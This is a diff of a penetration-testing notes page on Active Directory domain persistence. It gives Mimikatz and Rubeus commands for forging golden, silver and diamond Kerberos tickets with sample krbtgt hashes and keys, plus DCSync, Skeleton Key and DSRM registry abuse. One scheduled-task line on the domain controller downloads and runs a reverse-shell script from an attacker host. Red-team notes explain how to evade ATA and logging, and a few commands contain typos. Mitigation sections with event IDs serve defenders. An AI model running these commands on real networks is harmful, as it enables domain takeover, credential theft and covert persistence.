@@ -10,13 +10,13 @@
 <meta name="generator" content="Jekyll v3.8.4" />
 <meta property="og:title" content="Domain Persistence" />
 <meta property="og:locale" content="en_US" />
-<meta name="description" content="There is much more in Active Directory than just a Domain Admin. Once we have domain admin privileges new avenues of persistence, escalation to enterprise admin and attacks across trust appears." />
-<meta property="og:description" content="There is much more in Active Directory than just a Domain Admin. Once we have domain admin privileges new avenues of persistence, escalation to enterprise admin and attacks across trust appears." />
+<meta name="description" content="There is much more in Active Directory than just a Domain Admin. Once we have domain admin privileges new avenues of persistence, escalation to enterprise admin and attacks across trust appears. [corp-dc]: PS C:\Users\Administrator\Documents&gt; New-ItemProperty “HKLM:\SYSTEM\CurrentControlSet\Control\Lsa&quot; -Name “DsrmAdminLogonBehavior” -Value 2 -PropertyType DWORD" />
+<meta property="og:description" content="There is much more in Active Directory than just a Domain Admin. Once we have domain admin privileges new avenues of persistence, escalation to enterprise admin and attacks across trust appears. [corp-dc]: PS C:\Users\Administrator\Documents&gt; New-ItemProperty “HKLM:\SYSTEM\CurrentControlSet\Control\Lsa&quot; -Name “DsrmAdminLogonBehavior” -Value 2 -PropertyType DWORD" />
 <link rel="canonical" href="http://0.0.0.0:4000/hackingnotes/active-directory/domain-persistence/" />
 <meta property="og:url" content="http://0.0.0.0:4000/hackingnotes/active-directory/domain-persistence/" />
 <meta property="og:site_name" content="Hacking Notes" />
 <script type="application/ld+json">
-{"description":"There is much more in Active Directory than just a Domain Admin. Once we have domain admin privileges new avenues of persistence, escalation to enterprise admin and attacks across trust appears.","url":"http://0.0.0.0:4000/hackingnotes/active-directory/domain-persistence/","@type":"Article","publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://0.0.0.0:4000/hackingnotes/siteicon.png"}},"headline":"Domain Persistence","@context":"http://schema.org"}</script>
+{"description":"There is much more in Active Directory than just a Domain Admin. Once we have domain admin privileges new avenues of persistence, escalation to enterprise admin and attacks across trust appears. [corp-dc]: PS C:\\Users\\Administrator\\Documents&gt; New-ItemProperty “HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa&quot; -Name “DsrmAdminLogonBehavior” -Value 2 -PropertyType DWORD","url":"http://0.0.0.0:4000/hackingnotes/active-directory/domain-persistence/","@type":"Article","publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://0.0.0.0:4000/hackingnotes/siteicon.png"}},"headline":"Domain Persistence","@context":"http://schema.org"}</script>
 <!-- End Jekyll SEO tag -->
 
 		<link type="application/atom+xml" rel="alternate" href="http://0.0.0.0:4000/hackingnotes/feed.xml" title="Hacking Notes" />
@@ -56,8 +56,10 @@
 					
 						<li class="nav-item top-level current">
 							
-							<a href="/hackingnotes/active-directory/domain-enumeration/">Active Directory</a>
+							<a href="/hackingnotes/active-directory/introduction/">Active Directory</a>
 							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/active-directory/introduction/">Basics</a></li>
 								
 									<li class="nav-item "><a href="/hackingnotes/active-directory/domain-enumeration/">Domain Enumeration</a></li>
 								
@@ -70,6 +72,10 @@
 									<li class="nav-item "><a href="/hackingnotes/active-directory/cross-forest-attacks/">Cross Forest Attacks</a></li>
 								
 									<li class="nav-item "><a href="/hackingnotes/active-directory/forest-persistence/">Forest Persistence</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/active-directory/ad-certificate-services/">Active Directory Certificate Services</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/active-directory/securing-ad/">Hardening Active Directory</a></li>
 								
 									<li class="nav-item "><a href="/hackingnotes/active-directory/ad-attacks/">AD Attacks</a></li>
 								
@@ -84,6 +90,8 @@
 									<li class="nav-item "><a href="/hackingnotes/client-side-attacks/evil-pdf/">Evil PDF</a></li>
 								
 									<li class="nav-item "><a href="/hackingnotes/client-side-attacks/microsoft-office-macros/">Microsoft Office Macros</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/client-side-attacks/html-application/">HTML Application (HTA)</a></li>
 								
 							</ul>
 						</li>
@@ -112,6 +120,8 @@
 							<ul>
 								
 									<li class="nav-item "><a href="/hackingnotes/exploiting/buffer-overflow/">Buffer Overflow</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/exploiting/bof-linux/">Linux BoF 32bit</a></li>
 								
 							</ul>
 						</li>
@@ -163,6 +173,10 @@
 								
 									<li class="nav-item "><a href="/hackingnotes/post-exploitation/transfering-files/">Transfering Files</a></li>
 								
+									<li class="nav-item "><a href="/hackingnotes/post-exploitation/ata-evasion/">ATA Evasion</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/post-exploitation/bypass-applocker/">Bypass APPLocker</a></li>
+								
 							</ul>
 						</li>
 					
@@ -192,10 +206,52 @@
 					
 						<li class="nav-item top-level ">
 							
+							<a href="/hackingnotes/red-team/introduction/">Red Team</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/introduction/">Introduction</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/opsec-infrastructure/">OPSEC Infrastructure</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/c2-cobaltstrike/">C2 - Cobalt Strike</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/host-reconnaissance/">Host Reconnaissance</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/host-persistence/">Host Persistence</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/host-privilege-escalation/">Host Privilege Escalation</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/lateral-movement/">Lateral Movement</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/credentials-and-user-impersonation/">Credentials & User Impersonation</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/kibana/">Kibana - The Security App</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/pivoting/">Pivoting</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/ms-sql-servers/">MS SQL Servers</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/data-protection-api/">Data Protection API (DPAPI)</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/laps/">Local Administrator Password Solution (LAPS)</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/microsoft-defender/">Microsoft Defender Antivirus</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/application-whitelisting/">Application Whitelisting</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/exfiltration/">Exfiltration</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
 							<a href="/hackingnotes/services/ftp/">Services</a>
 							<ul>
 								
 									<li class="nav-item "><a href="/hackingnotes/services/ftp/">PORT 21/tcp - FTP</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/ssh/">PORT 22/tcp - SSH</a></li>
 								
 									<li class="nav-item "><a href="/hackingnotes/services/smtp/">PORT 25/tcp - SMTP</a></li>
 								
@@ -238,6 +294,8 @@
 									<li class="nav-item "><a href="/hackingnotes/software/jenkins/">Jenkins</a></li>
 								
 									<li class="nav-item "><a href="/hackingnotes/software/pypi-server/">PyPI Server</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/software/owa-exchange/">OWA Exchange</a></li>
 								
 							</ul>
 						</li>
@@ -305,9 +363,56 @@ Invoke-Mimikatz -Command <span class="s1">'"lsadump::dcsync /user:corp\krbtgt"'<
   <li><strong>Invoke-Mimikatz</strong></li>
 </ul>
 
-<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-Mimikatz -Command <span class="s1">'"kerberos::golden /User:Administrator /domain:corp.local /sid:S-1-5-21-268341927-4156873456-1784235843 /krbtgt:a9b30e5b0dc865eadcea9411e4ade72d /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'</span>
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: center"><strong>Parameter</strong></th>
+      <th style="text-align: center"><strong>Description</strong></th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: center">/user:Administrator</td>
+      <td style="text-align: center">Username fot which TGT is generated</td>
+    </tr>
+    <tr>
+      <td style="text-align: center">/domain:corp.local</td>
+      <td style="text-align: center">Domain FQDN</td>
+    </tr>
+    <tr>
+      <td style="text-align: center">/sid:S-1-5-21-268341927-4156873456-1784235843</td>
+      <td style="text-align: center">Domain SID</td>
+    </tr>
+    <tr>
+      <td style="text-align: center">/krbtgt:a9b30e5b0dc865eadcea9411e4ade72d</td>
+      <td style="text-align: center">NTLM(RC4) hash of the krbtgt account. Use /aes128 and /aes256 for AES keys.</td>
+    </tr>
+    <tr>
+      <td style="text-align: center">/id:500</td>
+      <td style="text-align: center">User RID (default 500)</td>
+    </tr>
+    <tr>
+      <td style="text-align: center">/groups:513</td>
+      <td style="text-align: center">Group ID (default 512,513,518,519,520)</td>
+    </tr>
+    <tr>
+      <td style="text-align: center">/startoffset:0</td>
+      <td style="text-align: center">Optional - When the ticket is available (Default 0 - right now, -10 - Available since 10minutes ago)</td>
+    </tr>
+    <tr>
+      <td style="text-align: center">/endind:600</td>
+      <td style="text-align: center">Optional - The default AD setting is about 10 hours (10h * 60min = 600).</td>
+    </tr>
+    <tr>
+      <td style="text-align: center">/renewmax:10080</td>
+      <td style="text-align: center">Optional - Mimikatz by default create a ticket lifetime with 10 years of renewal. Default AD setting is 7 days (7d * 24h * 60min = 10080)</td>
+    </tr>
+  </tbody>
+</table>
 
-Invoke-Mimikatz -Command <span class="s1">'"kerberos::golden /User:Administrator /domain:corp.local /sid:S-1-5-21-268341927-4156873456-1784235843 /krbtgt:a9b30e5b0dc865eadcea9411e4ade72d /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ticket"'</span>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-Mimikatz -Command <span class="s1">'"kerberos::golden /User:Administrator /domain:corp.local /sid:S-1-5-21-268341927-4156873456-1784235843 /krbtgt:a9b30e5b0dc865eadcea9411e4ade72d /id:500 /groups:513 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'</span>
+
+Invoke-Mimikatz -Command <span class="s1">'"kerberos::golden /User:Administrator /domain:corp.local /sid:S-1-5-21-268341927-4156873456-1784235843 /aes256:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /id:500 /groups:513 /startoffset:0 /endin:600 /renewmax:10080 /ticket"'</span>
 </code></pre></div></div>
 <blockquote>
   <p><strong>Note</strong>: <code class="highlighter-rouge">/ptt</code> injects the ticket in current PowerShell process.</p>
@@ -318,16 +423,23 @@ Invoke-Mimikatz -Command <span class="s1">'"kerberos::golden /User:Administrator
 <blockquote>
   <p><strong>RedTeam Note</strong>: Avoid detection by creating a ticket with less duration than the maximum in kerberos policy. So create a ticket and inmediately use it.</p>
 
-  <p><code class="highlighter-rouge">/endin:600</code> Mimikatz by default create a ticket with 10 years of lifetime. The default AD setting is about 10 hours (10h * 60min = 600).</p>
+  <p><code class="highlighter-rouge">/endin:600</code> Mimikatz by default create a ticket with 10 years of lifetime.</p>
 
-  <p><code class="highlighter-rouge">/renewmax:10080</code> Mimikatz by default create a ticket lifetime with 10 years of renewal. Default AD setting is 7 days (7d * 24h * 60min = 10080)</p>
+  <p><code class="highlighter-rouge">/renewmax:10080</code> Mimikatz by default create a ticket lifetime with 10 years of renewal.</p>
 </blockquote>
+
+<blockquote>
+  <p><strong>RedTeam Note</strong>: To prevent beeing detected of ATA use the <code class="highlighter-rouge">aes256</code> keys.</p>
+</blockquote>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-Mimikatz -Command <span class="s1">'"kerberos::golden /User:Administrator /domain:corp.local /sid:S-1-5-21-268341927-4156873456-1784235843 /krbtgt:a9b30e5b0dc865eadcea9411e4ade72d /id:500 /groups:513 /startoffset:0 /endin:600 /renewmax:10080 /aes256:&lt;aes256keysofkrbtgt&gt; /ptt"'</span>
+</code></pre></div></div>
 
 <ul>
   <li><strong>Rubeus.exe</strong></li>
 </ul>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.\Rubeus.exe ptt /ticket:ticket.kirbi
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.\Rubeus.exe golden /aes256:&lt;aes256&gt; /user:Administrator /domain:corp.local /sid:S-1-5-21-268341927-4156873456-1784235843 /nowrap
 </code></pre></div></div>
 
 <ul>
@@ -352,13 +464,39 @@ python psexec.py corp.local/Administrador@dc01.corp.local -k -no-pass
   <p><strong>Note</strong>: A shell via WMI can not be obtained, so do not use PowerShell Remote.</p>
 </blockquote>
 
+<p><img src="/hackingnotes/images/golden_ticket_psremoting.png" alt="Golden Ticket" /></p>
+
+<p>In order to execute commands we can do a <strong>dcsync attack</strong> and once obtained the hash do a over-pass-the-hash.</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-Mimikatz -Command <span class="s1">'"lsadump::dcsync /user:corp\Administrator"'</span>
+</code></pre></div></div>
+<blockquote>
+  <p><strong>Note</strong> DCSync attack can be done on any machine even if it is not part of the domain.</p>
+</blockquote>
+
+<h2 id="mitigation">Mitigation</h2>
+
+<p>While creating a golden ticket the attacker creates some events in logs:</p>
+
+<ul>
+  <li>Event ID <strong>4624</strong>: Account Logon</li>
+  <li>Event ID <strong>4672</strong>: Admin Logon</li>
+</ul>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">Get-WinEvent</span> -FilterHashtable @<span class="o">{</span><span class="nv">Logname</span><span class="o">=</span><span class="s1">'Security'</span>;<span class="nv">ID</span><span class="o">=</span>4672<span class="o">}</span> -MaxEvents 1 | <span class="nb">Format-List</span> -Property <span class="k">*</span>
+</code></pre></div></div>
+
+<p>TGT lifetime is not logged in <code class="highlighter-rouge">4769</code> event, however it can be correlated when a <code class="highlighter-rouge">4769</code> event appears without a prior <code class="highlighter-rouge">4768</code> alert. It’s not possible to request a TGS without a TGT, and if there is no record of a TGT being issued, we can assume that has been crafted offline.</p>
+
+<p>Other trick that defenders do is alert on <code class="highlighter-rouge">4769</code> for sensitive users such as default administrator account.</p>
+
 <p><a href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets">https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets</a></p>
 
 <p><a href="https://book.hacktricks.xyz/windows/active-directory-methodology/golden-ticket">https://book.hacktricks.xyz/windows/active-directory-methodology/golden-ticket</a></p>
 
 <h1 id="silver-ticket">Silver Ticket</h1>
 
-<p>A Silver Ticket is a valid <strong>TGS</strong> which is encrypted and signed by the NTLM hash of the service account of the service running with that account. Services will allow access only to the services themselves.</p>
+<p>A Silver Ticket is a valid <strong>TGS</strong> which is encrypted and signed by the NTLM hash of the service account like the Machine account hash (DC01$). The TGS will allow access only to the service requested.</p>
 
 <p>This technique is a reasonable persistence because the ticket would be valid for 30 days in computer accounts (default). We are going to target the domain controller machine account. First we need the DC machine account hash.</p>
 
@@ -370,20 +508,73 @@ python psexec.py corp.local/Administrador@dc01.corp.local -k -no-pass
   <li><strong>Invoke-Mimikatz</strong></li>
 </ul>
 
-<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-Mimikatz -Command <span class="s1">'"kerberos::golden /domain:corp.local /sid:S-1-5-21-268341927-4156873456-1784235843 /target:dc01.corp.local /service:CIFS /rc4:6f5b5acaf6744d567ac55e67ff22 /user:Administrator /id:500 /groups:512 /ptt"'</span>
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: center"><strong>Parameter</strong></th>
+      <th style="text-align: center"><strong>Description</strong></th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: center">/user:Administrator</td>
+      <td style="text-align: center">Username fot which TGS is generated</td>
+    </tr>
+    <tr>
+      <td style="text-align: center">/domain:corp.local</td>
+      <td style="text-align: center">Domain FQDN</td>
+    </tr>
+    <tr>
+      <td style="text-align: center">/sid:S-1-5-21-268341927-4156873456-1784235843</td>
+      <td style="text-align: center">Domain SID</td>
+    </tr>
+    <tr>
+      <td style="text-align: center">/target:dc.corp.local</td>
+      <td style="text-align: center">Target server FQDN</td>
+    </tr>
+    <tr>
+      <td style="text-align: center">/service:CIFS</td>
+      <td style="text-align: center">The SPN name of the service for which TGS will be created</td>
+    </tr>
+    <tr>
+      <td style="text-align: center">/rc4:6f5b5acaf6744d567ac55e67ff22</td>
+      <td style="text-align: center">NTLM(RC4) hash of the machine account (DC01$). Use /aes128 and /aes256 for using AES keys</td>
+    </tr>
+    <tr>
+      <td style="text-align: center">/id:500</td>
+      <td style="text-align: center">User RID (default 500)</td>
+    </tr>
+    <tr>
+      <td style="text-align: center">/groups:513</td>
+      <td style="text-align: center">Group ID (default 512,513,518,519,520)</td>
+    </tr>
+  </tbody>
+</table>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-Mimikatz -Command <span class="s1">'"kerberos::golden /domain:corp.local /sid:S-1-5-21-268341927-4156873456-1784235843 /target:dc.corp.local /service:CIFS /rc4:6f5b5acaf6744d567ac55e67ff22 /user:Administrator /id:500 /groups:512 /ptt"'</span>
+
+Invoke-Mimikatz -Command <span class="s1">'"kerberos::golden /domain:corp.local /sid:S-1-5-21-268341927-4156873456-1784235843 /target:dc.corp.local /service:CIFS /aes256:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /user:Administrator /id:500 /groups:512 /ptt"'</span>
 </code></pre></div></div>
+<blockquote>
+  <p><strong>Note</strong>: <code class="highlighter-rouge">/ptt</code> injects the ticket in current PowerShell process.</p>
+
+  <p><code class="highlighter-rouge">/ticket</code> saves the ticket to a file for later use.</p>
+</blockquote>
 
 <blockquote>
   <p><strong>Note</strong>: Similar command can be used for any other service on a machine: <code class="highlighter-rouge">CIFS</code>, <code class="highlighter-rouge">HOST</code>, <code class="highlighter-rouge">RPCSS</code>, <code class="highlighter-rouge">WSMAN</code>…</p>
 </blockquote>
 
-<p>Use <code class="highlighter-rouge">klist</code> to list all kerberos tickets:</p>
+<p>Finally we can list the content of File System (In that case because we forged a Ticket for CIFS service on the DC).</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>klist
+<ul>
+  <li><strong>Rubeus</strong></li>
+</ul>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.\Rubeus.exe silver /service:cifs/dc-01.corp.local /aes256:&lt;aes256keys&gt; /user:Administrator /domain:corp.local /sid:S-1-5-21-268341927-4156873456-1784235843 /nowrap
 </code></pre></div></div>
-<p>And finally we can list the content of File System.</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ls \\dc01.corp.local\c$
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ls \\dc.corp.local\c$
 </code></pre></div></div>
 
 <p>This table shows the available services:</p>
@@ -413,7 +604,11 @@ python psexec.py corp.local/Administrador@dc01.corp.local -k -no-pass
       <td style="text-align: center">HOST</td>
     </tr>
     <tr>
-      <td style="text-align: center">Windows File Sharing, PsExec</td>
+      <td style="text-align: center">Windows File Sharing</td>
+      <td style="text-align: center">CIFS</td>
+    </tr>
+    <tr>
+      <td style="text-align: center">PsExec</td>
       <td style="text-align: center">CIFS</td>
     </tr>
     <tr>
@@ -437,12 +632,12 @@ python psexec.py corp.local/Administrador@dc01.corp.local -k -no-pass
 
 <p>We just need to create a ticket for the <code class="highlighter-rouge">HOST</code> SPN which will allow us to schedule a task on the target. And then schedule and execute a task.</p>
 
-<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>schtasks /create /S dc01.corp.local /SC Weekly /RU <span class="s2">"NT Authority\SYSTEM"</span> /TN <span class="s2">"STCheck"</span> /TR <span class="s2">"powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://10.10.10.10/Invoke-PowerShellTcp.ps1''')'"</span>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>schtasks /create /S dc01.corp.local /SC Weekly /RU <span class="s2">"NT Authority\SYSTEM"</span> /TN <span class="s2">"STCheck"</span> /TR <span class="s2">"powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString('''http://10.10.10.10/Invoke-PowerShellTcp.ps1''')'"</span>
 
 schtasks /Run /S dc01.corp.local /TN <span class="s2">"STCheck"</span>
 </code></pre></div></div>
 <blockquote>
-  <p><strong>Note</strong>: In that case a Nishang Reverve TCP shell was spawned.</p>
+  <p><strong>Note</strong>: Create a new schtask with different <strong>TN</strong> name for every try.</p>
 </blockquote>
 
 <h2 id="execute-wmi-queries">Execute WMI queries</h2>
@@ -454,11 +649,24 @@ schtasks /Run /S dc01.corp.local /TN <span class="s2">"STCheck"</span>
 <span class="nb">Invoke-WmiMethod </span>win32_process -ComputerName <span class="nv">$Computer</span> -Name create -ArgumentList <span class="s2">"</span><span class="nv">$RunCommand</span><span class="s2">"</span>
 
 wmic dc01.corp.local list full /format:list
+wmic /node:target-computer-name <span class="k">process </span>call create “cmd.exe /c task-name”
 </code></pre></div></div>
+<p>There are several scripts such as <code class="highlighter-rouge">WmiSploit</code> that helps to create a shell or execute commands on a target (similar to PSRemoting but with WMI).</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Enter-WmiShell -ComputerName dc01.corp.local -UserName user
+Invoke-WmiCommand -ComputerName dc01.corp.local -Credential <span class="nv">$cred</span> -ScriptBlock <span class="o">{</span><span class="nb">whoami</span><span class="o">}</span>
+</code></pre></div></div>
+<blockquote>
+  <p><strong>Note</strong> Import both modules <code class="highlighter-rouge">Enter-WmiShell.ps1</code> and <code class="highlighter-rouge">Invoke-WmiCommand</code> are used.</p>
+</blockquote>
+
+<ul>
+  <li><a href="https://github.com/secabstraction/WmiSploit">https://github.com/secabstraction/WmiSploit</a></li>
+</ul>
 
 <h2 id="psexec">PsExec</h2>
 
-<p>To run commands on other machine with <code class="highlighter-rouge">PsExec</code> we just need to create a ticket for <code class="highlighter-rouge">CIFS</code> service.</p>
+<p>To run commands on other machine with <code class="highlighter-rouge">PsExec</code> we just need to create a ticket for <code class="highlighter-rouge">CIFS</code> and <code class="highlighter-rouge">HOST</code> service.</p>
 
 <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.\PsExec.exe -accepteula \\dc01.corp.local cmd
 </code></pre></div></div>
@@ -476,6 +684,78 @@ Enter-PSSession -Session <span class="nv">$sess</span>
 <p>We can dump DC database using DCSync by crafting a silver ticket with the <code class="highlighter-rouge">LDAP</code> SPN.</p>
 
 <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-Mimikatz -Command <span class="s1">'"lsadump::dcsync /dc:dc01.corp.local /domain:corp.local /user:krbtgt"'</span>
+</code></pre></div></div>
+
+<h2 id="mitigation-1">Mitigation</h2>
+
+<p>While creating a silver ticket the attacker creates some events in logs:</p>
+
+<ul>
+  <li>Event ID <strong>4624</strong>: Account Logon</li>
+  <li>Event ID <strong>4634</strong>: Account Logoff</li>
+  <li>Event ID <strong>4672</strong>: Admin Logon</li>
+</ul>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">Get-WinEvent</span> -FilterHashtable @<span class="o">{</span><span class="nv">Logname</span><span class="o">=</span><span class="s1">'Security'</span>;<span class="nv">ID</span><span class="o">=</span>4672<span class="o">}</span> -MaxEvents 1 | <span class="nb">Format-List</span> -Property <span class="k">*</span>
+</code></pre></div></div>
+<blockquote>
+  <p><strong>RedTeam Note</strong>: Silver Ticket is very hard to be detected.</p>
+</blockquote>
+
+<h1 id="diamond-ticket">Diamond Ticket</h1>
+
+<p>A golden ticket is forged completely offline, encrypted with the krbtgt hash, and then passed into a logon session for use. Because DCs don’t track if a TGT have been legitimately issued,they will accept TGTs that are encrypted with its own krbtgt hash.</p>
+
+<p>Like a golden ticket, a diamond ticket can be used to access any services as any user.</p>
+
+<p>A <strong>diamond ticket</strong> is made by modifying the fields of a legitimate TGT that was issued by a DC. This is achieved by requesting a TGT, decrypting it with the domain’s krbtgt hash, modifying the desired fields of the ticket, then re-encrypting it. So:</p>
+
+<ul>
+  <li>TGS-REQs will have a preceding AS-REQ.</li>
+  <li>The TGT was issued by DC which means it will have all the correct details from the domain’s kerberos policy.</li>
+</ul>
+
+<blockquote>
+  <p><strong>OPSEC Alert</strong> <code class="highlighter-rouge">Diamond Ticket</code> is more silent than <code class="highlighter-rouge">Golden Ticket</code>.</p>
+</blockquote>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.\Rubeus.exe diamond /tgtdeleg /ticketuser:jdoe /ticketuserid:1106 /gorups:512 /krbkey:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /nowrap
+</code></pre></div></div>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: center"><strong>Parameter</strong></th>
+      <th><strong>Description</strong></th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: center">/tgtdeleg</td>
+      <td>Uses the Kerberos GSS-API to obtain a useable TGT for the user.</td>
+    </tr>
+    <tr>
+      <td style="text-align: center">/ticketuser</td>
+      <td>Username to impersonate</td>
+    </tr>
+    <tr>
+      <td style="text-align: center">/ticketuserid</td>
+      <td>Domain RID of that principal. Can be obtained with:  <code class="highlighter-rouge">Get-DomainUser -Identity jdoe -Properties objectsid</code></td>
+    </tr>
+    <tr>
+      <td style="text-align: center">/groups</td>
+      <td>Desired group RID (512 - Domain Admins).</td>
+    </tr>
+    <tr>
+      <td style="text-align: center">/krbkey</td>
+      <td>krbtgt AES256 hash</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>We can check that the TGT has been modified with <code class="highlighter-rouge">describe</code>:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.\Rubeus.exe describe /ticket:doIFYj[...snip...]MuSU8=
 </code></pre></div></div>
 
 <h1 id="skeleton-key">Skeleton Key</h1>
@@ -510,7 +790,42 @@ mimikatz# misc::skeleton
 mimikatz# !-
 </code></pre></div></div>
 
-<p>The DC can not be patched twice.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mimikatz# !misc::skeleton
+</code></pre></div></div>
+
+<blockquote>
+  <p><strong>The DC can not be patched twice.</strong></p>
+</blockquote>
+
+<h2 id="mitigation-2">Mitigation</h2>
+
+<p>We can detect the Skeleton Key attack looking the events in logs.</p>
+
+<ul>
+  <li>System Event ID <strong>7045</strong>: A service was installed in the system</li>
+  <li>Security Event ID <strong>4673</strong>: Sensitive Privilege Use</li>
+  <li>Event ID <strong>4611</strong>: A trusted logon process has been registered with the Local Security Authority</li>
+</ul>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">Get-WinEvent</span> -FilterHashtable @<span class="o">{</span><span class="nv">Logname</span><span class="o">=</span><span class="s1">'System'</span>;<span class="nv">ID</span><span class="o">=</span>7045<span class="o">}</span> | ?<span class="o">{</span><span class="nv">$_</span>.message -like <span class="s2">"*Kernel Mode Driver*"</span><span class="o">}</span>
+
+<span class="c1"># Not recommended, detects only stock mimidrv</span>
+<span class="nb">Get-WinEvent</span> -FilterHashtable @<span class="o">{</span><span class="nv">Logname</span><span class="o">=</span><span class="s1">'System'</span>;<span class="nv">ID</span><span class="o">=</span>7045<span class="o">}</span> | ?<span class="o">{</span><span class="nv">$_</span>.message -like <span class="s2">"*Kernel Mode Driver*"</span><span class="o">}</span> -and <span class="nv">$_</span>.message -like <span class="s2">"*mimidrv*"</span><span class="o">}</span>
+</code></pre></div></div>
+
+<blockquote>
+  <p><strong>RedTeam Note</strong>: This attack is very noisy.</p>
+</blockquote>
+
+<p>We can also mitigate that running <code class="highlighter-rouge">lsass.exe</code> as a protected process that forces the attacker to load a kernel mode driver.</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Net-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name RunAsPPL -Value 1 -Verbose
+</code></pre></div></div>
+
+<p>Verify after a reboot:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-WmiEvent -FilterHashtable @<span class="o">{</span><span class="nv">Logname</span><span class="o">=</span><span class="s1">'System'</span>;<span class="nv">ID</span><span class="o">=</span>12<span class="o">}</span> | ?<span class="o">{</span><span class="nv">$_</span>.message -like <span class="s2">"*protected process*"</span><span class="o">}</span>
+</code></pre></div></div>
 
 <h1 id="directory-services-restore-mode-dsrm">Directory Services Restore Mode (DSRM)</h1>
 
@@ -528,14 +843,21 @@ mimikatz# !-
 <p>Since we have the NTLM hash, we can pass the hash to authenticate. But, the Logon Behaviour for the DSRM account needs to be changed before we can use its hash.</p>
 
 <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Enter-PSSession -ComputerName dc01
-<span class="nb">New-ItemProperty</span> <span class="s2">"HKLM:\System\CurrentControlSet\Control\Lsa\"</span> -Name <span class="s2">"DsrmAdminLogonBehaviour"</span> -Value 2 -PropertyType DWORD
+<span class="o">[</span>corp-dc]: <span class="nb">PS </span>C:\Users\Administrator\Documents&gt; <span class="nb">New-ItemProperty</span> <span class="s2">"HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\"</span> -Name <span class="s2">"DsrmAdminLogonBehavior"</span> -Value 2 -PropertyType DWORD
+
+DsrmAdminLogonBehavior : 2
